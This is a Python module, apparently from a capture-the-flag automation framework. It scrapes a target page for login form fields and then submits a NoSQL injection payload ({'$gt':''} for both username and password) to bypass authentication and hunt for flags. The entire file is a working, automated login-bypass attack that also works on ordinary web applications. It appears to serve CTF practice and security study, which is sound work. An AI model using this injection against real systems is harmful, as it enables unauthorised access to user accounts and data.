from unit import BaseUnit
from collections import Counter
import sys
from io import StringIO
import argparse
from pwn import *
import subprocess
import os
import units.raw
import re
import units.web
import requests
import magic
import units
import traceback

potential_username_variables = [
	'username', 'user', 'uname', 'un', 'name', 'user1', 'input1', 'uw1', 'username1', 'uname1', 'tbUsername', 'usern', 'id'
]
potential_password_variables = [
	'password', 'pass', 'pword', 'pw', 'pass1', 'input2', 'password1', 'pw1', 'pword1', 'tbPassword'
]

user_regex = "<\s*input.*name\s*=\s*['\"](%s)['\"]" % "|".join(potential_username_variables)
pass_regex = "<\s*input.*name\s*=\s*['\"](%s)['\"]" % "|".join(potential_password_variables)

class Unit(units.web.WebUnit):

	def __init__(self, katana, parent, target):

		# Run the parent constructor, to ensure this is a valid URL
		super(Unit, self).__init__(katana, parent, target)
		if not katana.config['flag_format']:
			raise units.NotApplicable

		try:
			self.session = requests.Session()
			self.response = self.session.get(self.target)
		except requests.exceptions.ConnectionError:
			raise units.NotApplicable

		self.action = re.findall(r"<\s*form.*action\s*=\s*['\"](.+?)['\"]", self.response.text, flags=re.IGNORECASE)
		self.method = re.findall(r"<\s*form.*method\s*=\s*['\"](.+?)['\"]", self.response.text, flags=re.IGNORECASE)

		self.username = re.findall(user_regex, self.response.text, flags=re.IGNORECASE)
		self.password = re.findall(pass_regex, self.response.text, flags=re.IGNORECASE)
		
		# Only run this if we have potential information...
		if not (self.action and self.method and self.username and self.password):
			raise units.NotApplicable

	def evaluate(self, katana, case):
		
		if self.action and self.method and self.username and self.password:
			if self.action: action = self.action[0]
			if self.method: method = self.method[0]
			if self.username: username = self.username[0]
			if self.password: password = self.password[0]

			try:
				
				r = self.session.request(method.lower(), self.target.rstrip('/') + '/' + action.lstrip('.').lstrip('/'), json = {
					"username" : { "$gt":"" },
					"password" : { "$gt":"" },
				})
				
				# Hunt for flags if we have a successful injection!
				katana.locate_flags(self, r.text)
			except:
				# JOHN: Theoretically, if we find a valid method, this should not error...
				#       But if it does, we should see it.
				traceback.print_exc()
			
			
